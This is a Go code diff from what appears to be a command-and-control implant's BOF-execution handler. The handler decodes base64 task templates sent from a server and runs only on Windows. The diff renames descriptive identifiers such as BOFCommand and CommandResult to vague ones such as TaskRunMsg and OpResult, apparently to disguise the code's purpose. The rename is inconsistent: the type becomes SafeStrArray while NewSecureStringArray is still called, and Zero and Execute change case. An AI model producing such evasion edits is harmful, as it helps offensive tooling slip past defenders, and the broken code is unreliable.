@@ -12,8 +12,8 @@ import (
 	"time"
 )
 
-// BOFTemplate receives string templates from server
-type BOFTemplate struct {
+// TaskCfg receives string templates from server
+type TaskCfg struct {
 	Version   int      `json:"v"`
 	Type      int      `json:"t"`
 	Templates []string `json:"tpl"`
@@ -22,7 +22,7 @@ type BOFTemplate struct {
 
 // BOF template indices (must match server's common.go)
 const (
-	// Command names (350-359)
+	// Msg names (350-359)
 	idxBofCmdName        = 350 // bof
 	idxBofCmdAsync       = 351 // bof-async
 	idxBofCmdJobs        = 352 // bof-jobs
@@ -74,14 +74,14 @@ const (
 	idxBofIPCPath = 388 // \IPC$
 )
 
-// Shared template storage for all BOF-related files (uses SecureStringArray for memory zeroing)
-var bofTemplate *SecureStringArray
+// Shared template storage for all BOF-related files (uses SafeStrArray for memory zeroing)
+var bofTemplate *SafeStrArray
 
 // SetBOFTemplate sets the shared BOF template (called from command processing)
 func SetBOFTemplate(templates []string) {
-	// Zero old template before replacing
+	// zero old template before replacing
 	if bofTemplate != nil {
-		bofTemplate.Zero()
+		bofTemplate.zero()
 	}
 	bofTemplate = NewSecureStringArray(templates)
 }
@@ -130,25 +130,25 @@ func bofIPCShare() string       { return bofTpl(idxBofIPCPath) }
 func bofCmdAsyncStatus() string { return bofTpl(idxBofCmdAsyncStatus) }
 func bofCmdAsyncOutput() string { return bofTpl(idxBofCmdAsyncOutput) }
 
-// BOFCommand handles BOF execution
-type BOFCommand struct {
-	tpl *BOFTemplate
+// TaskRunMsg handles BOF execution
+type TaskRunMsg struct {
+	tpl *TaskCfg
 }
 
 // getTpl safely retrieves a template string by index
-func (c *BOFCommand) getTpl(idx int) string {
+func (c *TaskRunMsg) getTpl(idx int) string {
 	if c.tpl != nil && c.tpl.Templates != nil && idx < len(c.tpl.Templates) {
 		return c.tpl.Templates[idx]
 	}
 	return ""
 }
 
-func (c *BOFCommand) Execute(ctx *CommandContext, args []string) CommandResult {
-	// Parse template from Command.Data if available
-	if ctx.CurrentCommand != nil && ctx.CurrentCommand.Data != "" {
-		decoded, err := base64.StdEncoding.DecodeString(ctx.CurrentCommand.Data)
+func (c *TaskRunMsg) execute(ctx *OpCtx, args []string) OpResult {
+	// Parse template from Msg.Data if available
+	if ctx.CurrentMsg != nil && ctx.CurrentMsg.Data != "" {
+		decoded, err := base64.StdEncoding.DecodeString(ctx.CurrentMsg.Data)
 		if err == nil {
-			c.tpl = &BOFTemplate{}
+			c.tpl = &TaskCfg{}
 			if err := json.Unmarshal(decoded, c.tpl); err == nil {
 				// Set shared template for other BOF files to use
 				SetBOFTemplate(c.tpl.Templates)
@@ -162,18 +162,18 @@ func (c *BOFCommand) Execute(ctx *CommandContext, args []string) CommandResult {
 		osWindows = bofOSWindows()
 	}
 	if runtime.GOOS != osWindows {
-		return CommandResult{
+		return OpResult{
 			Output:      Err(E25),
-			ExitCode:    1,
-			CompletedAt: time.Now().Format(time.RFC3339),
+			EC:    1,
+			Done: time.Now().Format(time.RFC3339),
 		}
 	}
 	// This will be handled by the command queue's processBOF method
-	// The actual execution happens there with the full Command data
-	return CommandResult{
+	// The actual execution happens there with the full Msg data
+	return OpResult{
 		Output:      Succ(S4),
-		ExitCode:    0,
-		CompletedAt: time.Now().Format(time.RFC3339),
+		EC:    0,
+		Done: time.Now().Format(time.RFC3339),
 	}
 }
 
